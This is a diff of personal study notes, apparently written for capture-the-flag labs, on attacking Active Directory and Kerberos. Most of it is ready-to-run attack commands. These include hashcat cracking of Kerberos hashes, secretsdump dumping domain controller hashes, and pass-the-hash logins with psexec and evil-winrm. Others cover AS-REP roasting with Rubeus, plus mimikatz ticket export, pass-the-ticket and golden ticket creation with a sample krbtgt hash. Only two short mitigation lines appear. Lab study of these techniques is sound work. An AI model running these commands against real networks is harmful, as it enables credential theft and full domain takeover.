@@ -1,5 +1,46 @@
-# Definitions : 
 
+
+# ATTACKTIV DIRECTORY		
+## CRACK THE HASH
+The one i got in this case was : Kerberos 5 AS-REP etype 23
+```bash	
+hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force 
+```
+## ENUM SHARES WITH SMBCLIENT
+```bash
+smbclient -L 10.10.72.208 --user svc-admin
+```
+	
+## LOG INTO SHARES WITH SMBCLIENT
+```bash
+smbclient \\\\spookysec.local\\backup --user svc-admin
+```
+- spookysec.local can also be the IP address
+- admin is a valid user and we have his password
+
+## ENUM FOR ADDITIONNAL INFORMATIONS WITH secretdump.py
+(Admit that we have password for the user backup)
+```bash
+secretsdump.py -just-dc backup@spookysec.local
+```
+	
+## LOG IN WITH PSEXEC BY "PASSING THE HASH"
+```bash
+psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
+get cmd
+```
+
+## LOG IN WITH EVIL-WINRM BY "PASSING THE HASH"
+```bash
+evil-winrm -u administrator -H PUT_THE_HASH_HERE -i spookysec.local
+```
+- /!\ This only needs the second part of the NTLM hash
+- get powershell
+	
+
+
+# KERBEROAST
+# Definitions : 
 ## TGS : Ticket Granting Service
 - Used by the KDC
 - It take a TGT and return a ticket to a machine on the domain
@@ -38,6 +79,9 @@
 
 ## Privilege Attribute Certificate (PAC) 
 - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
+
+## Local Security Authority Subsystem Service (LSASS)
+ It's a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. 
 
 # AS-REQ // PRE-AUTHENTICATION
 
@@ -188,17 +232,118 @@ be careful of spaces and /n when copy-pasting
 hashcat -m 13100 -a 0 hash.txt Pass.txt
 ```
 
-# What Can a Service Account do?
+## What Can a Service Account do?
 
 - There are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.
 - If the service account is a domain admin, we can dump NTDS.dit.
 - If the service account isn't a domain admin, we can escalate privileges or even spray passwords the password against other accounts
 
-# Mitigation
-- String passwords (As always -_-)
+## Mitigation
+- Strong passwords (As always -_-)
 - Don't make services accounts domain admins
 
+# AS-REP ROASTING / RUBEUS
 
+ AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.  
+- This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+ ```bash
+ Rubeus.exe asreproast 
+ ```
 
+***Be careful, you need to add 23$ after $krb5asrep$***
+(To me, it seems to work even less 23$)
 
+Then, crack the hash
+```bash
+hashcat -m 18200 hash.txt Pass.txt
+```
 
+# PASS THE TICKET (PTT)/ MIMIKATZ
+
+## OVERWIEW
+Mimikatz is well known to be a great tool to dump credentials from AD but it cans also be useful to dump tickets in Kerberos
+
+### How 'Pass the ticket' works
+1) Mimikatz dumps the TGT from LSASS (it will gives a .kirbi ticket)
+2) Pass the ticket and acts as it's original owner
+
+## PREPARE MIMIKATZ & DUMP THE TiCKET
+```cmd
+mimikatz.exe
+privilege::debug
+```
+Ensure this output is '20'OK
+If it doesn't, it means that you don't have admin privileges
+```cmd
+sekurlsa::tickets /export
+```
+This will export the ticket (.kirbi) to the directory you're in
+***At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier we harvested earlier***
+
+## PASS THE TICKET
+If you leave mimikatz, you will see that there are tickets in the directory. 
+Copy the one that is interesting for you and return to mimiktatz
+```cmd 
+mimikatz.exe
+```
+This will cache the ticket and impersonate it
+```cmd
+kerberos::ptt [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+```
+- The ticket is like : [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+- The output should be "* File : <Stuff> OK"
+Let's just verify that it works by listing all cached tickets
+You need to exit mimikatz so :
+```cmd
+exit
+```
+and
+```cmd
+klist
+```
+
+We now have impersonnated the ticket and have the same rights 
+We can now list the admin$ share
+```cmd
+dir \\IP\admin$
+```
+
+# GOLDEN/SILVER TICKETS ATTACKS / MIMIKATZ
+Mimikatz is also known to be a great tool to create Golden and Silver tickets
+Silver tickets are stealther than the golden ones but quite less powerfull
+
+In order to create a golden ticket, we need the KRBTGT = service account that create TGT with KDC  
+In order to create a silver ticket, we only need any accessible account that can log into the desired service
+
+## DUMP THE KRBTGT HASH
+Starts mimikatz : 
+```cmd
+privilege::debug 
+```
+- ensure this outputs [privilege '20' ok] : 
+```cmd
+privilege::debug 
+```
+```cmd
+lsadump::lsa /inject /name:krbtgt 
+```
+- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+The output will be useful for the next step :
+["Mimikatz"](images/mimikatz_lsadump.png)
+
+## CREATE THE GOLDEN TICKET
+```cmd
+Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+```
+
+- Administrator : The username
+- domain : The domain controller name
+- SID : the second part of the first line from the output
+- krbtgt : the primary NTLM hash
+- id : 500 -> idk what is that
+
+## USE THE GOLDEN TICKET
+```cmd 
+misc::cmd
+```
